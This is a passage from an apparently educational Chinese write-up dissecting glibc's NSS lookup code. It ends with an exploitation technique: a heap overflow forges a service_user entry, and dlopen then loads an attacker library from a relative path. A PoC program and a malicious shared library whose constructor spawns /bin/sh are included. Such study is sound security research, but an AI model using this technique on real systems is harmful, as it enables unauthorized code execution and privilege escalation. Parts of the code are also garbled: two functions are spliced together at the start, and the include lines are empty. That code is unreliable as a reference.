    */
    int DB_LOOKUP_FCT(service_user** ni, const char* fct_name, const char* fct2_name, void** fctp)
    {
        //根据数据库名找到对应服务
        if (DATABASE_NAME_SYMBOL == NULL && __nss_database_lookup(DATABASE_NAME_STRING, ALTERNATE_NAME_STRING, DEFAULT_CONFIG, &DATABASE_NAME_SYMBOL) entry; entry != NULL; entry = entry->next)
                if (strcmp(database, entry->name) == 0)
                    *ni = entry->service;
            //如果database没找到就试一试别名
            if (*ni == NULL && alternate_name != NULL)
                for (entry = service_table->entry; entry != NULL; entry = entry->next)
                    if (strcmp(alternate_name, entry->name) == 0)
                        *ni = entry->service;
        }
        //没能找到对应配置文件, 就尝试使用默认配置文件
        if (*ni == NULL) {
            ...;  
        }
        __libc_lock_unlock(lock);
        return *ni != NULL ? 0 : -1;
    }
    libc_hidden_def(__nss_database_lookup)
  * 其中`nss_parse_file()`就是打开`/etc/nsswitch.conf`然后逐行解析并构建对应链表项, 对于passwd数据库, 解析后结果如下. 注意: 这里仅仅只是字符串的解析与复制, 并没有真的打开对应文件.
## __nss_lookup()
  * `__nss_lookup()`会在服务链表ni中搜索名为fct_name的处理函数, 当fct_name搜索失败时, 搜索fct2_name, 把找到的函数指针写入fctp中
    int __nss_lookup(service_user** ni, const char* fct_name, const char* fct2_name, void** fctp)
    {
        //先尝试在第一个服务中搜索fct_name
        *fctp = __nss_lookup_function(*ni, fct_name);
        //没找到的话就试试fct2_name
        if (*fctp == NULL && fct2_name != NULL)
            *fctp = __nss_lookup_function(*ni, fct2_name);
        //如果还是没找到的话 && 在没找到时运行继续查找 && 存在下一个服务 =>就在下一个服务中寻寻找
        while (*fctp == NULL && nss_next_action(*ni, NSS_STATUS_UNAVAIL) == NSS_ACTION_CONTINUE && (*ni)->next != NULL) {
            *ni = (*ni)->next;  //*ni现在指向下一个服务
            //根据fct_name搜索
            *fctp = __nss_lookup_function(*ni, fct_name);
            //没找到的话就试试fct2_name
            if (*fctp == NULL && fct2_name != NULL)
                *fctp = __nss_lookup_function(*ni, fct2_name);
        }
        return *fctp != NULL ? 0 : (*ni)->next == NULL ? 1 : -1;
    }
    libc_hidden_def(__nss_lookup)
  * 显然, `__nss_lookup()`依赖于`__nss_lookup_function()`, 我们以第一次调用为例子进行研究, 其调用现场如下
## __nss_lookup_function()
  * 整理后函数定义如下.每个服务对象`service_user`都有一个搜索数作为缓存, `__nss_lookup_function()`会先尝试从搜索树中查询, 如果找不到再尝试加载模块文件然后在文件中搜索函数符号的地址
    //根据数据源ni, 返回符号为fct_name的函数的地址
    void* __nss_lookup_function(service_user* ni, const char* fct_name)
    {
        void **found, *result;
        /* We now modify global data.  Protect it.  */
        __libc_lock_lock(lock);
        /*
            - 先前搜索过的函数都保存在一个搜索树中, 作为缓存
                - 搜索数的树根为ni->known
                - 该搜索树的节点都有一个指向known_function对象的指针
                    - 该树以known_function对象中的函数名fct_name为键对节点进行排序
                    - known_function对象中fct_ptr为节点的值
            - 成功搜索到时__tserach会返回对应节点
            - 搜索失败时会以fct_name为键向搜索数中插入一个节点并返回, 如果要缓存搜索结果的话只需要设置这个节点的know_function指针, 而不用再搜索一次
        */
        found = __tsearch(&fct_name, &ni->known, &known_compare);
        if (found == NULL) //溢出
            result = NULL;
        else if (*found != &fct_name) { //成功在缓存中找到, 返回对应的函数指针
            /*
                - 在这个服务的缓存中寻找fct_name对应的函数
                    - 如果树中没找到就会插入一个新节点, 新节点->key = &fct_name
                    - 如果树中找到了就会返回对应节点, 这个节点->key保存的字符串与fct_name一致, 但是地址不同
            */
            result = ((known_function*)*found)->fct_ptr;
        } else { //缓存中没有, 在对应模块中搜索后分配一个known_function对象插入缓存
            //分配对象
            known_function* known = malloc(sizeof *known);
            if (!known) { //分配失败, 退出前要把之前在搜索树中分配的节点删掉
                __tdelete(&fct_name, &ni->known, &known_compare);
                free(known);
                result = NULL;
            } else {
                //为插入的节设置一个新的known_function对象
                *found = known;
                known->fct_name = fct_name;
                //加载这个服务对应的模块: /lib/libnss_SERVICE.so.1
                if (nss_load_library(ni) != 0)
                    goto remove_from_tree;
                if (ni->library->lib_handle == (void*)-1l) //加载模块失败
                    result = NULL;
                else {
                    //构造函数名: "_nss_" + ni->name + "_" + fct_name + "\0"
                    size_t namlen = (5 + strlen(ni->name) + 1 + strlen(fct_name) + 1);
                    char name[namlen];
                    __stpcpy(__stpcpy(__stpcpy(__stpcpy(name, "_nss_"), ni->name), "_"), fct_name);
                    //在模块中寻找对应函数
                    result = __libc_dlsym(ni->library->lib_handle, name);
                }
                //函数已经找到, 写入known_function对象
                known->fct_ptr = result;
            }
        }
        /* Remove the lock.  */
        __libc_lock_unlock(lock);
        //返回函数地址
        return result;
    }
    libc_hidden_def(__nss_lookup_function)
  * 我们关注下模块具体是怎么加载的, `nss_load_library()`的调用现场如下
## nss_load_library()
  * 函数定义如下.
    //加载服务ni对应的模块
    static int nss_load_library(service_user* ni)
    {
        //如果这个服务是第一次用, 那么先创建一个service_library对象, 这是进行字符串的复制, 不会打开文件
        if (ni->library == NULL) {
            static name_database default_table;
            ni->library = nss_new_service(service_table ?: &default_table, ni->name);
            if (ni->library == NULL)
                return -1;
        }
        //句柄为NULL表示这个服务并没有打开模块, 因此要加载服务对应模块
        if (ni->library->lib_handle == NULL) {
            //先构造服务对应的依赖库的名称:  "libcnss_" + 服务名 + ".so" + 库版本号 + "\0". 这里会打开libnss_compat.so.2
            size_t shlen = (7 + strlen(ni->name) + 3 + strlen(__nss_shlib_revision) + 1);
            int saved_errno = errno;
            char shlib_name[shlen];
            __stpcpy(__stpcpy(__stpcpy(__stpcpy(shlib_name, "libnss_"), ni->name), ".so"), __nss_shlib_revision);
            //然后调用dl_open()打开这个函数
            ni->library->lib_handle = __libc_dlopen(shlib_name);
            if (ni->library->lib_handle == NULL) {
                /* Failed to load the library.  */
                ni->library->lib_handle = (void*)-1l;
                __set_errno(saved_errno);
            }
        }
        return 0;
    }
  * 这里需要注意一点: 当dlopen()加载一个so文件时, 如果这个so文件设置了构造函数, 那么dlopen()会自动执行此函数
## __nss_next2()
  * 函数定义如下. 这个函数会遍历服务链表, 对于每一个服务调用`__nss_lookup_function()`进行搜索
        /*
        - 切换到下一个数据源, 寻找符号为fct_name的函数, 把函数地址写入fctp中, 如果fct_name没找到的话就试试fct2_name
        - 返回值:
            - -1:没找到
            - 0: 成功切换到下一个函数
            - 1: 遍历结束
    */  
    int __nss_next2(service_user** ni, const char* fct_name, const char* fct2_name, void** fctp, int status, int all_values)
    {
        if (all_values) {
            if (nss_next_action(*ni, NSS_STATUS_TRYAGAIN) == NSS_ACTION_RETURN
                && nss_next_action(*ni, NSS_STATUS_UNAVAIL) == NSS_ACTION_RETURN
                && nss_next_action(*ni, NSS_STATUS_NOTFOUND) == NSS_ACTION_RETURN
                && nss_next_action(*ni, NSS_STATUS_SUCCESS) == NSS_ACTION_RETURN)
                return 1;
        } else {
            /* This is really only for debugging.  */
            if (__builtin_expect(NSS_STATUS_TRYAGAIN > status
                        || status > NSS_STATUS_RETURN,
                    0))
                __libc_fatal("illegal status in __nss_next");
            if (nss_next_action(*ni, status) == NSS_ACTION_RETURN)
                return 1;
        }
        //服务链表的next为NULL, 表示链表结束
        if ((*ni)->next == NULL)
            return -1;
        do {
            *ni = (*ni)->next; //下一个链表节点
            *fctp = __nss_lookup_function(*ni, fct_name); //加载这个服务对应的模块, 然后在模块中寻找fct_name对应的函数地址
            //如果fct_name没找到的话试试fct2_name
            if (*fctp == NULL && fct2_name != NULL)
                *fctp = __nss_lookup_function(*ni, fct2_name);
            //循环条件: 还没找到函数 && 在没找到时运行继续寻找 && 还有下一个服务
        } while (*fctp == NULL && nss_next_action(*ni, NSS_STATUS_UNAVAIL) == NSS_ACTION_CONTINUE && (*ni)->next != NULL);
        return *fctp != NULL ? 0 : -1;
    }
    libc_hidden_def(__nss_next2)
## 攻击面
  * 根据上述分析, 我们着重考虑`nss_load_library()`, 这个函数负责加载服务对应的库, 如果`ni->library==NULL`或者`ni->library->lib_handle == NULL`, 该函数会根据`ni->name`构造出so库名, 然后调用dlopen()打开这个库
  * 假如我们只有一次堆溢出的机会, 不可泄露地址, 我们可以溢出服务链表中的`service_user`对象:令`ni->library为NULL`, 令`ni->name="XXX"`, 这样就可以在下一次搜索服务链表打开`libnss_XXX.so.2`文件, 并且会执行`libnss_XXX.so.2`的构造函数.
  * 例子 
    * 第一次调用`getpwuid()`时会解析nsswitch.conf文件把配置写入到service_table中, 在startp中写入passwd数据库对应的服务链表, 然后再进行函数搜索工作
    * 假如现在溢出`service_table`中`group`数据库的一个服务, 也就是`service_user`对象: 令`ni->library为NULL`, 令`ni->name="X/X"`, 这样就在`group`数据库中伪造了一个模块
    * 第二次调用`getgrgid()`时仍需要nsswitch.conf文件, 但是由于上次调用`getpwuid()`已经设置过service_table了, 因此会直接从这个链表中获取`group`数据库对应的服务模块
    * 进入`__nss_lookup_function()`寻找函数时会先调用`nss_load_library()`加载模块, 由于`ni->library`为NULL, 因此会调用dlopen()加载我们的库
    * 如果我们覆盖name为X的话, 那么构造出来的文件名为`libnss_X.so.2`, dlopen()会默认到`/usr/lib`中寻找, 显然我们不能在这个目录中写入文件, 如果覆盖name为`X/X`的话, 得到的文件名为`libnss_X/X.so.2`, 会把前面一部分解析成目录, 会现在当前目录下寻找`libnss_X`目录, 再找`X.so.2`文件, 这个就很好写入了
  * 例子:
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct service_user {
        struct service_user* next; //链表指针
        int actions[5]; /* Action according to result.  */
        void* library; //这个服务对应的模块, 也就是动态链接库libnss_SERVICE.so.1
        void* known; //指向一个搜索的树根, 这个搜索树保存了之前搜索过的函数名, 当做缓存用
        char name[0]; //这个服务的名字 (`files', `dns', `nis', ...)
    } service_user;
    int main(void)
    {
        char* p = malloc(0x10); //0x555555756260
        getpwuid(1000); //initial
        //heao overflow to forge service_user
        service_user* ni = p+0x17d0;  //systemd
        ni->next = 0x0;
        ni->library = NULL;
        ni->known = NULL;
        strcpy(ni->name, "X/X");
        getgrgid(1000); //trigger
    }
  * 覆盖之后的`service_table`
  * 共享库
    /*
        mkdir libnss_X
        gcc -fPIC -shared -o ./libnss_X/X.so.2
    */
    #include 
    #include 
    static void __attribute__((constructor)) MyInit(void);
    static void MyInit(void)
    {
        write(1, "MyInit\n", 7);
        execve("/bin/sh\x00", 0, 0);
    }